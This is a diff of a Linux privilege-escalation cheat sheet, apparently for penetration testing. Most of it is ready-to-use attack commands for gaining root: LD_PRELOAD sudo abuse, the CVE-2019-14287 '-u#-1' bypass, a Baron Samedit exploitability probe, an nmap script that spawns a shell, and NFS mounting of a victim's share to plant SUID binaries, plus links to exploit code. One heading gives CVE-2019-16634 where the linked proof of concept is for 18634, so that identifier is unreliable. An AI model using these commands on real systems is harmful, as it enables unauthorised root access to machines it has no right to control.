@@ -87,17 +87,26 @@ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 
 
 ## CVE-2019-14287 
+Sudo versions < 1.8.28. Sees -1 and reads as 0 (UID of root) 
+
 sudo -l, see (ALL,!root)  
 
     sudo -u#-1 [binary escape]  
-## CVE-2019-16634 
-sudo su root, type password, see ******: passwd feedback enabled  
+    
+## CVE-2019-16634 Buffer Overflow 
+versions of sudo earlier than 1.8.26  
+sudo su root, type password, see ******: pwfeedback enabled  
 
 [proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634)  
-## CVE-2021-3156 - Baron Samedit 
-[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
-[proof of concept](https://github.com/stong/CVE-2021-3156)  
 
+## CVE-2021-3156 - Baron Samedit Heap Buffer Overflow 
+[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
+[poc 2](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)   
+[exploit](https://github.com/blasty/CVE-2021-3156)  
+
+any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1
+
+    sudoedit -s '\' $(python3 -c 'print("A"*1000)')                  #check to see if machine is exploitable 
 
 ## Misc sudo binaries  
     echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
@@ -206,6 +215,10 @@ Allows you to mount drive onto attack box, create a SUID binary that you can run
     cat /etc/exports     
     showmount -e [victim ip]   
     mount -o rw,vers=2 [victim ip]:/mntFolder /mntFolder/tmp   
+
+## Sequoia (CVE-2021-33909)  
+[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909)  
+
 
 ## Kernel Exploits 
     uname -a  
